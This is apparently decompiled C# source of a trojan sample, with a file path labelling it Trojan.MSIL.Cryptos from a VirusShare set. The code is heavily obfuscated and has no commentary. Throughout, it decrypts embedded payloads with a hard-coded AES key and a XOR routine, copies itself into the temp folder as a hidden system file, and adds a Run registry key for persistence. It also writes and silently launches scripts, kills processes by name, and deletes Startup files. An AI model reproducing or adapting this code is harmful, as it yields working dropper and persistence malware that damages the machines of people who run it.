// Decompiled with JetBrains decompiler
// Type: .
// Assembly: file, Version=0.0.0.0, Culture=neutral, PublicKeyToken=72ec7481cfa903fe
// MVID: 17BB4BA8-04F1-4383-A3D1-FFAF516C79D3
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Cryptos.cvxf-4765b693a5f0024c84d332e633fb35b8d37891fb93e6a2bf615652c82aa7fdde.exe

using \u0001;
using \u0005;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0005
{
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0002 \u0001;

    static \u0002() => \u0003.\u0002(typeof (\u0002));

    [STAThread]
    public static void \u0002()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        if (true)
          goto label_77;
label_1:
        int num3 = 2;
        \u0002.\u0016();
label_2:
        num3 = 3;
        \u0002.\u0018();
label_4:
        num3 = 4;
        \u0002.\u0011();
label_5:
        if (true)
          goto label_78;
label_6:
        \u0002.\u0008();
        goto label_7;
label_78:
        num3 = 5;
        goto label_6;
label_7:
        num3 = 6;
        if (\u0002.\u0007(\u0002.\u0001(647)))
          goto label_19;
label_8:
        num3 = 7;
        string str1 = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
label_9:
        num3 = 8;
label_10:
        string tempPath = Path.GetTempPath();
label_11:
        num3 = 9;
        if (File.Exists(tempPath + \u0002.\u0001(682)))
          goto label_17;
label_12:
        num3 = 10;
        \u0002.\u0005();
label_13:
        num3 = 11;
        \u0002.\u0015();
label_14:
        int num4 = 12;
label_15:
        num3 = num4;
        \u0002.\u0012();
label_16:
        num3 = 13;
        \u0002.\u0019();
        goto label_19;
label_17:
        num3 = 15;
label_18:
        num3 = 16;
        \u0002.\u001A();
label_19:
        num3 = 19;
label_20:
        num3 = 20;
label_21:
        num3 = 21;
label_22:
        num3 = 22;
        string s1;
        if (true)
          s1 = \u0002.\u0001(703);
        else
          goto label_28;
label_24:
        num3 = 23;
        byte[] numArray1 = \u0002.\u0002(Convert.FromBase64String(s1));
label_25:
        num3 = 24;
        string str2 = \u0002.\u0001(503183);
label_26:
        num3 = 25;
        string str3 = \u0002.\u0001(503200);
label_27:
        num3 = 26;
label_28:
        num3 = 27;
label_29:
        num3 = 28;
label_30:
        num3 = 29;
        string str4;
        string s2 = str4;
label_31:
        num3 = 30;
        byte[] numArray2 = \u0002.\u0002(Convert.FromBase64String(s2), \u0002.\u0001(503217));
label_32:
        num3 = 31;
        if (true)
        {
          string str5 = \u0002.\u0001(503294);
        }
        else
          goto label_71;
label_34:
        num3 = 32;
        string str6 = \u0002.\u0001(503311);
label_35:
        num3 = 33;
        string str7;
        string s3 = str7;
label_36:
        num3 = 34;
        \u0002.\u0002(Convert.FromBase64String(s3));
label_37:
        num3 = 35;
        if (true)
        {
          string str8 = \u0002.\u0001(503328);
        }
label_39:
        int num5 = 36;
        if (num5 != 0)
        {
          num3 = num5;
          string str9 = \u0002.\u0001(503345);
        }
        else
          goto label_64;
label_41:
        num3 = 37;
        string str10 = \u0002.\u0001(503362);
label_42:
        string s4;
        if (true)
        {
          num3 = 38;
          string str11;
          s4 = str11;
        }
        else
          goto label_75;
label_44:
        num3 = 39;
        \u0002.\u0002(Convert.FromBase64String(s4), \u0002.\u0001(503379));
label_45:
        num3 = 40;
        string str12 = \u0002.\u0001(503388);
label_46:
        int num6 = 41;
label_47:
        num3 = num6;
        string str13 = \u0002.\u0001(503405);
label_48:
        num3 = 42;
        string str14 = \u0002.\u0001(503422);
label_49:
        num3 = 43;
        \u0002.\u0003();
label_50:
        num3 = 44;
label_51:
        num3 = 45;
label_52:
        num3 = 46;
label_53:
        num3 = 47;
        \u0005.\u0001.\u0002(numArray1, \u0002.\u0001(503439));
label_54:
        num3 = 48;
        \u0005.\u0001.\u0002(numArray2, \u0002.\u0001(503439));
label_55:
        int num7 = 49;
        if (num7 == 0)
        {
          num6 = num7;
          goto label_47;
        }
        else
        {
          num3 = num7;
          if (\u0002.\u0002(\u0002.\u0001(503476)))
            goto label_59;
        }
label_57:
        num3 = 50;
        if (\u0002.\u0004(\u0002.\u0001(682)))
          goto label_59;
label_58:
        num3 = 51;
        \u0002.\u0013();
label_59:
        num3 = 54;
        if (\u0002.\u0003(\u0002.\u0001(503493)))
          goto label_61;
label_60:
        num3 = 55;
        \u0002.\u0014();
label_61:
        num3 = 57;
        \u0002.\u0004();
label_62:
        num3 = 58;
        \u0002.\u001B();
label_63:
        num5 = 59;
label_64:
        num3 = num5;
        if (\u0002.\u0007(\u0002.\u0001(647)))
          goto label_66;
label_65:
        num3 = 60;
        \u0002.\u0007();
label_66:
        num3 = 62;
        \u0002.\u0006();
label_67:
        num3 = 63;
        \u0002.\u0010();
label_68:
        num3 = 64;
        \u0002.\u000E();
label_69:
        num3 = 65;
        \u0002.\u0017();
label_70:
        num3 = 66;
        \u0002.\u000F();
        ProjectData.EndApp();
        goto label_82;
label_71:
        if (true)
        {
          int num8 = num1 + 1;
          if (false)
          {
            num4 = num8;
            goto label_15;
          }
          else
          {
            num1 = 0;
            switch (num8)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_7;
              case 7:
                goto label_8;
              case 8:
                goto label_9;
              case 9:
                goto label_11;
              case 10:
                goto label_12;
              case 11:
                goto label_13;
              case 12:
                goto label_14;
              case 13:
                goto label_16;
              case 14:
              case 17:
              case 18:
              case 19:
                goto label_19;
              case 15:
                goto label_17;
              case 16:
                goto label_18;
              case 20:
                goto label_20;
              case 21:
                goto label_21;
              case 22:
                goto label_22;
              case 23:
                goto label_24;
              case 24:
                goto label_25;
              case 25:
                goto label_26;
              case 26:
                goto label_27;
              case 27:
                goto label_28;
              case 28:
                goto label_29;
              case 29:
                goto label_30;
              case 30:
                goto label_31;
              case 31:
                goto label_32;
              case 32:
                goto label_34;
              case 33:
                goto label_35;
              case 34:
                goto label_36;
              case 35:
                goto label_37;
              case 36:
                goto label_39;
              case 37:
                goto label_41;
              case 38:
                goto label_42;
              case 39:
                goto label_44;
              case 40:
                goto label_45;
              case 41:
                goto label_46;
              case 42:
                goto label_48;
              case 43:
                goto label_49;
              case 44:
                goto label_50;
              case 45:
                goto label_51;
              case 46:
                goto label_52;
              case 47:
                goto label_53;
              case 48:
                goto label_54;
              case 49:
                goto label_55;
              case 50:
                goto label_57;
              case 51:
                goto label_58;
              case 52:
              case 53:
              case 54:
                goto label_59;
              case 55:
                goto label_60;
              case 56:
              case 57:
                goto label_61;
              case 58:
                goto label_62;
              case 59:
                goto label_63;
              case 60:
                goto label_65;
              case 61:
              case 62:
                goto label_66;
              case 63:
                goto label_67;
              case 64:
                goto label_68;
              case 65:
                goto label_69;
              case 66:
                goto label_70;
              case 67:
                goto label_82;
              default:
                goto label_81;
            }
          }
        }
        else
          goto label_10;
label_75:
        switch (num2)
        {
          case 1:
            goto label_71;
          default:
            goto label_81;
        }
label_77:
        num2 = 1;
        goto label_1;
label_74:
        num1 = num3;
        goto label_75;
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_74;
      }
label_81:
      throw ProjectData.CreateProjectError(-2146828237);
label_82:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void \u0003()
    {
      string Source = \u0002.\u0001(503506);
      string str1 = \u0002.\u0001(503579);
      string str2 = \u0002.\u0001(503596);
      string str3 = \u0002.\u0001(503613);
      FileAttributes fileAttributes;
      do
      {
        FileSystem.FileCopy(Source, \u0002.\u0001(503439));
        fileAttributes = FileAttributes.Hidden | FileAttributes.System;
      }
      while (false);
      File.SetAttributes(\u0002.\u0001(503439), fileAttributes);
    }

    public static byte[] \u0002([In] byte[] obj0)
    {
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.IV = new byte[16]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8,
          (byte) 9,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7
        };
        rijndaelManaged.Key = new byte[16]
        {
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1,
          (byte) 9,
          (byte) 8,
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1
        };
        return rijndaelManaged.CreateDecryptor().TransformFinalBlock(obj0, 0, obj0.Length);
      }
    }

    public static void \u0004()
    {
      int num = Operators.CompareString(\u0002.\u0001(503630), \u0002.\u0001(503639), false);
      if (true)
      {
        if (num != 0)
          return;
        string str1 = \u0002.\u0001(503660);
        string str2 = \u0002.\u0001(503677);
        if (true)
        {
          if (true)
          {
            if (true)
            {
              string str3 = \u0002.\u0001(503694);
            }
            else
              goto label_12;
          }
          else
            goto label_10;
        }
        string str4 = \u0002.\u0001(503711);
        string str5 = \u0002.\u0001(503728);
        string str6 = \u0002.\u0001(503733);
        if (true)
          goto label_15;
label_8:
        string str7 = \u0002.\u0001(503742);
        goto label_9;
label_15:
        goto label_8;
      }
      else
        goto label_13;
label_9:
      string str8 = \u0002.\u0001(503759);
      string str9 = \u0002.\u0001(503776);
label_10:
      string str10 = \u0002.\u0001(503793);
      if (File.Exists(\u0002.\u0001(503810)))
        ;
      string str11 = \u0002.\u0001(503831);
label_12:
      string str12 = \u0002.\u0001(503848);
      num = 2;
label_13:
      if (num != 0)
      {
        string str13 = \u0002.\u0001(503865);
      }
      else
        goto label_9;
    }

    public static void \u0005()
    {
      string str = \u0002.\u0001(503882);
      File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + str);
    }

    public static void \u0006()
    {
      if (Operators.CompareString(\u0002.\u0001(503903), \u0002.\u0001(503639), false) == 0)
      {
        do
        {
          string str1 = \u0002.\u0001(503912);
          string str2 = \u0002.\u0001(503929);
          string str3 = \u0002.\u0001(503831);
        }
        while (false);
        string str4 = \u0002.\u0001(503848);
        string str5 = \u0002.\u0001(503865);
        string str6 = \u0002.\u0001(503946);
        if (true)
        {
          string str7 = \u0002.\u0001(503963);
          if (true)
          {
            string str8 = \u0002.\u0001(503972);
            string str9 = \u0002.\u0001(503989);
          }
          else
            goto label_9;
        }
        else
          goto label_8;
      }
      else
        goto label_9;
label_6:
      string str10 = \u0002.\u0001(503912);
label_7:
      if (false)
        goto label_6;
label_8:
      string str11 = \u0002.\u0001(503929);
label_9:
      if (false)
        goto label_7;
    }

    public static void \u0007()
    {
      string Left = \u0002.\u0001(504006);
      while (Operators.CompareString(Left, \u0002.\u0001(503639), false) == 0)
      {
        string str1 = \u0002.\u0001(503831);
        if (true)
        {
          if (false)
            continue;
        }
        else
          goto label_6;
label_4:
        string str2 = \u0002.\u0001(503848);
        if (true)
          goto label_9;
label_5:
        string str3 = \u0002.\u0001(503865);
        goto label_6;
label_9:
        goto label_5;
label_6:
        if (true)
        {
          string str4 = \u0002.\u0001(503946);
          break;
        }
        goto label_4;
      }
    }

    public static void \u0008()
    {
      string str1 = \u0002.\u0001(504015);
      string str2 = \u0002.\u0001(504032);
      string str3 = \u0002.\u0001(504049);
      if (false)
        return;
      string str4 = \u0002.\u0001(503972);
      string str5 = \u0002.\u0001(504066) + Path.GetTempPath() + \u0002.\u0001(504066);
      string str6 = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
      if (File.Exists(str5 + \u0002.\u0001(503882)))
        ;
    }

    public static void \u000E()
    {
      int millisecondsTimeout = 20001;
      int num;
      if (true)
      {
        if (millisecondsTimeout == 0)
        {
          num = millisecondsTimeout;
          goto label_6;
        }
        else
          goto label_11;
      }
      else
        goto label_7;
label_3:
      string str1 = \u0002.\u0001(504032);
      string str2 = \u0002.\u0001(504049);
      string str3 = \u0002.\u0001(503972);
      string str4 = \u0002.\u0001(503989);
      string path;
      FileAttributes fileAttributes;
      File.SetAttributes(path, fileAttributes);
      string str5 = \u0002.\u0001(503929);
label_4:
      string str6 = \u0002.\u0001(504093);
      string str7 = \u0002.\u0001(504110);
      string str8 = \u0002.\u0001(504127);
      string str9 = \u0002.\u0001(504144);
      if (true)
        num = 0;
      else
        goto label_3;
label_6:
      millisecondsTimeout = 0;
      millisecondsTimeout = num;
label_7:
      if (millisecondsTimeout == 0)
      {
        if (millisecondsTimeout == 0)
        {
          if (true)
          {
            string str10 = \u0002.\u0001(504161);
            string str11 = \u0002.\u0001(504178);
            string str12 = \u0002.\u0001(504195);
            return;
          }
          goto label_4;
        }
        else
          goto label_12;
      }
label_11:
      Thread.Sleep(millisecondsTimeout);
      string str13 = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
label_12:
      string tempPath = Path.GetTempPath();
      fileAttributes = FileAttributes.Hidden | FileAttributes.System;
      path = tempPath + \u0002.\u0001(504067);
      File.SetAttributes(tempPath + \u0002.\u0001(503882), fileAttributes);
      File.SetAttributes(tempPath + \u0002.\u0001(504080), fileAttributes);
      goto label_3;
    }

    public static void \u000F()
    {
      if (true)
      {
        string str = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
        goto label_11;
      }
label_3:
      string str1 = \u0002.\u0001(504225);
      string str2 = \u0002.\u0001(503929);
      string tempPath;
      string str3;
      File.Delete(tempPath + \u0002.\u0001(677) + str3);
      string str4 = \u0002.\u0001(503831);
      do
      {
        string str5 = \u0002.\u0001(503848);
        if (true)
        {
          string str6 = \u0002.\u0001(503865);
          string str7 = \u0002.\u0001(503946);
        }
        else
          goto label_8;
      }
      while (false);
      string str8 = \u0002.\u0001(504015);
      do
      {
        File.Delete(tempPath + \u0002.\u0001(677) + str1);
      }
      while (false);
label_8:
      File.Delete(tempPath + \u0002.\u0001(504238));
      if (File.Exists(tempPath + \u0002.\u0001(504259)))
        return;
      string str9 = \u0002.\u0001(504276);
      if (true)
      {
        File.Delete(tempPath + \u0002.\u0001(677) + str9);
        return;
      }
label_11:
      tempPath = Path.GetTempPath();
      str3 = \u0002.\u0001(504212);
      string str10 = \u0002.\u0001(503912);
      goto label_3;
    }

    public static byte[] \u0002([In] byte[] obj0, [In] string obj1)
    {
      byte[] bytes = Encoding.Default.GetBytes(obj1);
      int num1 = (int) obj0[checked (obj0.Length - 1)];
      int num2 = 112;
      if (num2 != 0)
        num1 ^= num2;
      else
        goto label_5;
label_4:
      int num3;
      if (true)
        num3 = num1;
      int length1 = obj0.Length;
      num2 = -1;
      num1 = length1;
label_5:
      if (num2 != 0)
      {
        byte[] arySrc = new byte[checked (num1 + 1)];
        int num4 = 0;
        int num5 = obj0.Length;
        while (true)
        {
          int num6 = 1;
          int num7;
          int num8;
          while (true)
          {
            int num9 = checked (num5 - num6);
            int index1 = num4;
            int num10;
            int length2;
            int num11;
            while (true)
            {
              do
              {
                num7 = index1;
                num8 = num9;
                if (true)
                {
                  if (num7 <= num8)
                  {
                    int index2;
                    arySrc[index1] = checked ((byte) ((int) obj0[index1] ^ num3 ^ (int) bytes[index2]));
                    num10 = index2;
                    length2 = obj1.Length;
                    num11 = 1;
                    if (num11 != 0)
                    {
                      int num12 = checked (length2 - num11);
                      if (num10 == num12)
                      {
                        if (true)
                          index2 = 0;
                      }
                      else
                        checked { ++index2; }
                    }
                    else
                      goto label_1;
                  }
                  else
                    goto label_18;
                }
                else
                  goto label_2;
              }
              while (false);
              checked { ++index1; }
            }
label_1:
            num6 = num11;
            num5 = length2;
            num4 = num10;
          }
label_2:
          num5 = num8;
          num4 = num7;
        }
label_18:
        return (byte[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) arySrc, (Array) new byte[checked (obj0.Length - 2 + 1)]);
      }
      goto label_4;
    }

    private static bool \u0002([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0002.\u0001(504289));
      if (true)
        goto label_10;
label_1:
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_8;
        }
      }
      else
        goto label_7;
label_5:
      if (false)
        goto label_9;
      else
        goto label_9;
label_7:
      int num;
      index = checked (num + 1);
label_8:
      bool flag;
      Process[] processArray;
      if (index < processArray.Length)
      {
        if (processArray[index] == null)
        {
          flag = false;
          goto label_5;
        }
        else
          flag = true;
      }
label_9:
      return flag;
label_10:
      processArray = processesByName;
      goto label_1;
    }

    private static bool \u0003([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0002.\u0001(504298));
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_7;
        }
      }
      else
        goto label_6;
label_4:
      if (false)
        goto label_8;
      else
        goto label_8;
label_6:
      int num;
      index = checked (num + 1);
label_7:
      bool flag;
      if (index < processesByName.Length)
      {
        if (processesByName[index] == null)
        {
          flag = false;
          goto label_4;
        }
        else
          flag = true;
      }
label_8:
      return flag;
    }

    private static bool \u0004([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0002.\u0001(504307));
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_7;
        }
      }
      else
        goto label_6;
label_4:
      if (false)
        goto label_8;
      else
        goto label_8;
label_6:
      int num;
      index = checked (num + 1);
label_7:
      bool flag;
      if (index < processesByName.Length)
      {
        if (processesByName[index] == null)
        {
          flag = false;
          goto label_4;
        }
        else
          flag = true;
      }
label_8:
      return flag;
    }

    private static bool \u0005([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0002.\u0001(504320));
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_7;
        }
      }
      else
        goto label_6;
label_4:
      if (false)
        goto label_8;
      else
        goto label_8;
label_6:
      int num;
      index = checked (num + 1);
label_7:
      bool flag;
      if (index < processesByName.Length)
      {
        if (processesByName[index] == null)
        {
          flag = false;
          goto label_4;
        }
        else
          flag = true;
      }
label_8:
      return flag;
    }

    private static bool \u0006([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0002.\u0001(504325));
      Process[] processArray1;
      if (true)
        processArray1 = processesByName;
      Process[] processArray2 = processArray1;
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_7;
        }
      }
      else
        goto label_6;
label_4:
      if (false)
        goto label_8;
      else
        goto label_8;
label_6:
      int num;
      index = checked (num + 1);
label_7:
      bool flag;
      if (index < processArray2.Length)
      {
        if (processArray2[index] == null)
        {
          flag = false;
          goto label_4;
        }
        else
          flag = true;
      }
label_8:
      return flag;
    }

    private static bool \u0007([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0002.\u0001(504330));
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_7;
        }
      }
      else
        goto label_6;
label_4:
      if (false)
        goto label_8;
      else
        goto label_8;
label_6:
      int num;
      index = checked (num + 1);
label_7:
      bool flag;
      if (index < processesByName.Length)
      {
        if (processesByName[index] == null)
        {
          flag = false;
          goto label_4;
        }
        else
          flag = true;
      }
label_8:
      return flag;
    }

    public static void \u0010()
    {
label_0:
      Process[] processesByName = Process.GetProcessesByName(\u0002.\u0001(504343));
label_18:
      int num1 = processesByName.Length;
      if (true)
      {
        if (num1 <= 0)
          return;
        num1 = 0;
      }
label_19:
      int num2 = checked (processesByName.Length - 1);
      int index = num1;
      while (index <= num2)
      {
        int num3 = processesByName[index].HasExited ? 1 : 0;
        if (true)
        {
          if (num3 != 0)
            goto label_12;
label_7:
          double num4 = (double) processesByName[index].WorkingSet64;
          double num5;
          while (true)
          {
            num5 = num4 / 1024.0;
            if (false)
              num4 = num5;
            else
              break;
          }
          if (num5 < 130.0)
          {
            try
            {
              processesByName[index].Kill();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              int num6 = (int) MessageBox.Show(ex.Message);
              ProjectData.ClearProjectError();
            }
          }
label_12:
          if (true)
          {
            if (true)
            {
              if (true)
                checked { ++index; }
              else
                goto label_7;
            }
            else
              goto label_0;
          }
          else
            goto label_18;
        }
        else
        {
          num1 = num3;
          goto label_19;
        }
      }
    }

    public static void \u0011()
    {
      string str = \u0002.\u0001(504352);
      string Left;
      if (true)
        Left = str;
      if (Operators.CompareString(Left, \u0002.\u0001(503639), false) != 0)
        ;
    }

    public static void \u0012()
    {
      if (Operators.CompareString(\u0002.\u0001(503639), \u0002.\u0001(503639), false) != 0)
        return;
      string str1 = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
      string str2 = \u0002.\u0001(504066) + Path.GetTempPath() + \u0002.\u0001(504066);
      string str3 = str2 + \u0002.\u0001(504238);
      FileSystem.FileCopy(Application.ExecutablePath, str2 + \u0002.\u0001(504238));
      StreamWriter streamWriter = new StreamWriter(str2 + \u0002.\u0001(504361));
      streamWriter.Write(\u0002.\u0001(504374));
      streamWriter.Dispose();
    }

    private static void \u0013()
    {
      string str1 = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
      string str2 = \u0002.\u0001(504066) + Path.GetTempPath() + \u0002.\u0001(504066);
      if (true)
        ;
      string s;
      \u0002.\u0002(Convert.FromBase64String(s), \u0002.\u0001(503379));
    }

    public static void \u0014()
    {
      do
      {
        string str1 = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
        string str2 = \u0002.\u0001(504066) + Path.GetTempPath() + \u0002.\u0001(504066);
        if (false)
          goto label_2;
      }
      while (false);
      goto label_3;
label_2:
      return;
label_3:
      string s;
      \u0002.\u0002(Convert.FromBase64String(s));
    }

    private static void \u0015()
    {
      if (Operators.CompareString(\u0002.\u0001(503639), \u0002.\u0001(503639), false) != 0)
        return;
      string str1 = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
      if (true)
        goto label_8;
label_3:
      string str2 = \u0002.\u0001(504479);
      string str3;
      string str4;
      string str5;
      string str6;
      string str7;
      int num;
      if (true)
      {
        str3 = str2 + \u0002.\u0001(504516);
        str4 = \u0002.\u0001(504577);
        string str8 = \u0002.\u0001(504289);
        str5 = \u0002.\u0001(504582) + \u0002.\u0001(504587);
        str6 = \u0002.\u0001(504592) + \u0002.\u0001(504605);
        str7 = \u0002.\u0001(504618);
        num = 72273848;
      }
      else
        goto label_6;
label_5:
      string str9 = \u0002.\u0001(504631);
      string str10 = \u0002.\u0001(504652);
      string tempPath = Path.GetTempPath();
label_6:
      StreamWriter streamWriter = new StreamWriter(tempPath + \u0002.\u0001(504259));
      streamWriter.Write(str4 + \u0002.\u0001(504657) + str6 + str5 + \u0002.\u0001(504666) + str3 + \u0002.\u0001(504671));
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write(str9 + str10 + \u0002.\u0001(504676) + str7 + \u0002.\u0001(504697));
      num = 387218;
      if (num != 0)
      {
        streamWriter.Dispose();
        return;
      }
      goto label_5;
label_8:
      goto label_3;
    }

    public static void \u0016()
    {
      if (Operators.CompareString(\u0002.\u0001(503639), \u0002.\u0001(503639), false) != 0)
        return;
      string tempPath = Path.GetTempPath();
      string str = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
      StreamWriter streamWriter = new StreamWriter(tempPath + \u0002.\u0001(504080));
      if (true)
      {
        streamWriter.Write(\u0002.\u0001(504718));
        streamWriter.Write(Environment.NewLine);
        do
        {
          streamWriter.Write(\u0002.\u0001(504731));
        }
        while (false);
        streamWriter.Write(Environment.NewLine);
      }
      streamWriter.Write(\u0002.\u0001(504768) + tempPath + \u0002.\u0001(504697));
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write(\u0002.\u0001(504789));
      streamWriter.Dispose();
    }

    public static void \u0017()
    {
      int num1 = \u0002.\u0006(\u0002.\u0001(504325)) ? 1 : 0;
      int num2;
      if (true)
      {
        if (num1 == 0)
          num2 = 0;
        else
          goto label_9;
      }
      else
        goto label_4;
label_3:
      if (num2 == 0)
        goto label_10;
label_5:
      string str = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
      ProcessStartInfo startInfo;
      string tempPath;
      do
      {
        startInfo = new ProcessStartInfo(tempPath + \u0002.\u0001(504806));
      }
      while (false);
      startInfo.CreateNoWindow = true;
      startInfo.WindowStyle = ProcessWindowStyle.Hidden;
      goto label_8;
label_10:
      tempPath = Path.GetTempPath();
      goto label_5;
label_4:
      num2 = num1;
      goto label_3;
label_8:
      Process.Start(startInfo);
label_9:
      if (false)
        goto label_8;
    }

    public static void \u0018()
    {
      RegistryKey currentUser;
      string str1;
      string str2;
      if (true)
      {
        if (false)
          return;
        string str3 = \u0002.\u0001(503639);
        if (true)
          goto label_11;
label_3:
        string Left;
        if (true)
        {
          if (true)
          {
            if (Operators.CompareString(Left, \u0002.\u0001(503639), false) != 0)
              return;
            string str4 = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
            str2 = \u0002.\u0001(504066) + Path.GetTempPath() + \u0002.\u0001(504066);
          }
          else
            goto label_9;
        }
label_8:
        currentUser = Registry.CurrentUser;
        str1 = \u0002.\u0001(504819);
label_9:
        if (false)
          goto label_8;
        else
          goto label_10;
label_11:
        Left = str3;
        goto label_3;
      }
label_10:
      currentUser.OpenSubKey(\u0002.\u0001(504836) + str1 + \u0002.\u0001(504869), true).SetValue(\u0002.\u0001(504886), (object) (str2 + \u0002.\u0001(682)));
    }

    public static void \u0019()
    {
      string str1;
      StreamWriter streamWriter;
      if (Operators.CompareString(\u0002.\u0001(503639), \u0002.\u0001(503639), false) == 0)
      {
        do
        {
          string str2 = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
          str1 = \u0002.\u0001(504066) + Path.GetTempPath() + \u0002.\u0001(504066) + \u0002.\u0001(504899);
          streamWriter = new StreamWriter(str1);
        }
        while (false);
        string str3 = \u0002.\u0001(504912);
        string str4 = \u0002.\u0001(504929);
        string str5 = \u0002.\u0001(504946);
        string str6 = \u0002.\u0001(504963);
        string str7 = \u0002.\u0001(504980);
        string str8 = \u0002.\u0001(504997);
        streamWriter.Write(\u0002.\u0001(505014));
      }
      else
        goto label_9;
label_4:
      streamWriter.Dispose();
      ProcessStartInfo startInfo = new ProcessStartInfo(str1);
      string str9 = \u0002.\u0001(504912);
      string str10 = \u0002.\u0001(504929);
      string str11 = \u0002.\u0001(504946);
      string str12 = \u0002.\u0001(504963);
      do
      {
        string str13 = \u0002.\u0001(504980);
        string str14 = \u0002.\u0001(504997);
        startInfo.CreateNoWindow = true;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        if (true)
        {
          Process.Start(startInfo);
          string str15 = \u0002.\u0001(504912);
          string str16 = \u0002.\u0001(504929);
          string str17 = \u0002.\u0001(504946);
        }
        else
          goto label_4;
      }
      while (false);
      string str18 = \u0002.\u0001(504963);
      string str19 = \u0002.\u0001(504980);
label_8:
      string str20 = \u0002.\u0001(504997);
label_9:
      if (true)
      {
        if (false)
          goto label_4;
      }
      else
        goto label_8;
    }

    public static void \u001A()
    {
      do
      {
        string str1 = Environment.GetEnvironmentVariable(\u0002.\u0001(664)) + \u0002.\u0001(677);
        string str2 = \u0002.\u0001(504066) + Path.GetTempPath() + \u0002.\u0001(504066);
        string str3 = \u0002.\u0001(503660);
        string str4 = \u0002.\u0001(503677);
        if (true)
        {
          string str5 = \u0002.\u0001(503694);
          int num1 = 5;
          string destFileName;
          string str6;
          string executablePath;
          while (num1 != 0)
          {
            destFileName = str2 + \u0002.\u0001(503882);
            str6 = str2 + \u0002.\u0001(682);
            int num2 = 6;
            if (num2 == 0)
              num1 = num2;
            else if (num2 == 0)
            {
              num1 = num2;
            }
            else
            {
              if (num2 != 0)
              {
                executablePath = Application.ExecutablePath;
                string str7 = \u0002.\u0001(503711);
                break;
              }
              goto label_9;
            }
          }
          File.Copy(executablePath, destFileName);
          RegistryKey localMachine = Registry.LocalMachine;
label_9:
          RegistryKey currentUser = Registry.CurrentUser;
          string str8 = \u0002.\u0001(504819);
          currentUser.OpenSubKey(\u0002.\u0001(504836) + str8 + \u0002.\u0001(504869), true).SetValue(\u0002.\u0001(504886), (object) str6);
        }
      }
      while (false);
    }

    private static void \u001B()
    {
      string Left;
      if (true)
      {
        string str = \u0002.\u0001(505079);
        if (true)
          Left = str;
      }
      if (Operators.CompareString(Left, \u0002.\u0001(503639), false) != 0)
        return;
      string str1 = \u0002.\u0001(505088);
      if (true)
        goto label_11;
label_4:
      do
      {
        string str2 = \u0002.\u0001(505105);
        string str3 = \u0002.\u0001(505122);
        string str4 = \u0002.\u0001(505139);
        string str5;
        do
        {
          str5 = \u0002.\u0001(505156);
        }
        while (false);
        if (!\u0002.\u0005(str5 + \u0002.\u0001(505161)))
        {
          string str6 = \u0002.\u0001(504912);
          string str7 = \u0002.\u0001(504929);
          string str8 = \u0002.\u0001(504946);
          string str9 = \u0002.\u0001(504963);
          string str10 = \u0002.\u0001(504980);
        }
        else
          goto label_2;
      }
      while (false);
      goto label_8;
label_2:
      return;
label_8:
      string str11 = \u0002.\u0001(504997);
      return;
label_11:
      goto label_4;
    }
  }
}
